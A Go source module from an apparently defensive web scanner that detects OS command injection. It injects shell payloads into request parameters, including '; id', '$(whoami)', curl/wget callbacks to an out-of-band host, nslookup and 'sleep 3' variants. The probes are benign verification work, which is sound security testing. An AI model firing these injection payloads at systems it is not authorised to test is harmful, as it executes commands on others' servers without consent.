package modules

import (
	"fmt"
	"net"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
	"time"
)

type CMDiModule struct{}

func NewCMDiModule() *CMDiModule {
	return &CMDiModule{}
}

func (m *CMDiModule) Name() string {
	return "cmdi"
}

func (m *CMDiModule) Description() string {
	return "Harmless OS Command Injection verification (safe id/whoami, OAST, and timing probes)"
}

var (
	idPattern     = regexp.MustCompile(`uid=\d+\([^)]+\)`)
	whoamiPattern = regexp.MustCompile(`(?m)^(?:root|www-data|nginx|apache|nobody|vapf|ubuntu|daemon)$`)
)

var cmdiProbes = []struct {
	Label   string
	Payload string
	Pattern *regexp.Regexp
}{
	{"id", "; id", idPattern},
	{"whoami", "| whoami", whoamiPattern},
	{"id", "&& id", idPattern},
	{"whoami", "&& whoami", whoamiPattern},
	{"id", "$(id)", idPattern},
	{"whoami", "$(whoami)", whoamiPattern},
	{"id", "`id`", idPattern},
	{"whoami", "`whoami`", whoamiPattern},
}

func (m *CMDiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		// 1. Output-based check (safe id / whoami)
		for _, probe := range cmdiProbes {
			var resp *client.Response
			var err error
			if isPost {
				headers := map[string]string{}
				if target.IsJSON {
					headers["Content-Type"] = "application/json"
				}
				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, probe.Payload), headers)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, probe.Payload), "", nil)
			}
			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			if probe.Pattern.MatchString(resp.Body) {
				f := &Finding{
					Module:      m.Name(),
					Title:       "OS Command Injection (Output Confirmed)",
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe.Payload,
					Detail:      fmt.Sprintf("Confirmed arbitrary command execution using harmless probe '%s'.", probe.Payload),
					Evidence:    fmt.Sprintf("Matched system user pattern in response body: %s", probe.Label),
					Remediation: "Avoid shell execution with request-controlled inputs. Use safe system APIs without shell invocation.",
					CWEID:       78,
				}
				f.SetConfidence(ConfidenceConfirmed)
				findings = append(findings, f)
				break
			}
		}

		if len(findings) > 0 {
			continue
		}

		// 2. Out-of-band (OAST) check (benign curl / wget / nslookup commands only)
		if target.OAST != nil {
			probeID := target.OAST.GenerateProbeID()
			cbURL := target.OAST.CallbackURL(probeID)
			hostOnly := target.OAST.PublicHost
			if strings.Contains(hostOnly, ":") {
				h, _, _ := net.SplitHostPort(hostOnly)
				if h != "" {
					hostOnly = h
				}
			}

			oastCmds := []string{
				fmt.Sprintf("; curl -s %s || wget -q -O- %s ;", cbURL, cbURL),
				fmt.Sprintf("$(curl -s %s || wget -q -O- %s)", cbURL, cbURL),
				fmt.Sprintf("`curl -s %s || wget -q -O- %s`", cbURL, cbURL),
				fmt.Sprintf("& nslookup %s.%s &", probeID, hostOnly),
			}

			for _, p := range oastCmds {
				var reqErr error
				if isPost {
					headers := map[string]string{}
					if target.IsJSON {
						headers["Content-Type"] = "application/json"
					}
					_, reqErr = c.Request("POST", target.URL, target.BuildBodyWithParam(param, p), headers)
				} else {
					_, reqErr = c.Request("GET", target.BuildURLWithParam(param, p), "", nil)
				}
				if reqErr != nil {
					continue
				}

				if hit, ok := target.OAST.WaitForHit(probeID, 3*time.Second); ok && hit != nil {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Blind OS Command Injection (OAST Callback Confirmed)",
						Severity:    SeverityCritical,
						URL:         target.URL,
						Parameter:   param,
						Payload:     p,
						Detail:      fmt.Sprintf("Confirmed arbitrary command execution via benign OAST callback for probe %s.", probeID),
						Evidence:    fmt.Sprintf("OAST hit from %s at %s (%s %s)", hit.RemoteAddr, hit.Timestamp.Format(time.RFC3339), hit.Method, hit.Path),
						Remediation: "Avoid shell execution with request-controlled inputs. Use parameterized exec APIs.",
						CWEID:       78,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					break
				}
			}
		}

		if len(findings) > 0 {
			continue
		}

		// 3. Time-based check (safe 3-second sleep)
		origVal := target.Params[param]
		if isPost {
			origVal = target.Data[param]
		}
		if origVal == "" {
			origVal = "1"
		}

		// Measure baseline latency
		start := time.Now()
		var baseErr error
		if isPost {
			headers := map[string]string{}
			if target.IsJSON {
				headers["Content-Type"] = "application/json"
			}
			_, baseErr = c.Request("POST", target.URL, target.BuildBodyWithParam(param, origVal), headers)
		} else {
			_, baseErr = c.Request("GET", target.BuildURLWithParam(param, origVal), "", nil)
		}
		baseDuration := time.Since(start)

		if baseErr != nil || baseDuration > 2*time.Second {
			continue
		}

		sleepProbes := []string{
			"; sleep 3 ;",
			"| sleep 3",
			"&& sleep 3",
			"$(sleep 3)",
			"`sleep 3`",
		}

		for _, sp := range sleepProbes {
			probeStart := time.Now()
			var probeErr error
			if isPost {
				headers := map[string]string{}
				if target.IsJSON {
					headers["Content-Type"] = "application/json"
				}
				_, probeErr = c.Request("POST", target.URL, target.BuildBodyWithParam(param, sp), headers)
			} else {
				_, probeErr = c.Request("GET", target.BuildURLWithParam(param, sp), "", nil)
			}
			probeDuration := time.Since(probeStart)

			if probeErr != nil {
				continue
			}

			if probeDuration >= 2800*time.Millisecond && probeDuration > baseDuration+2*time.Second {
				f := &Finding{
					Module:      m.Name(),
					Title:       "Blind OS Command Injection (Time-Based)",
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     sp,
					Detail:      fmt.Sprintf("Response was delayed by %v (baseline: %v) matching 'sleep 3' probe.", probeDuration, baseDuration),
					Evidence:    fmt.Sprintf("Baseline: %v, Probe elapsed: %v", baseDuration, probeDuration),
					Remediation: "Avoid shell execution with request-controlled inputs. Use parameterized exec APIs.",
					CWEID:       78,
				}
				f.SetConfidence(ConfidenceProbable)
				findings = append(findings, f)
				break
			}
		}
	}

	return findings, nil
}
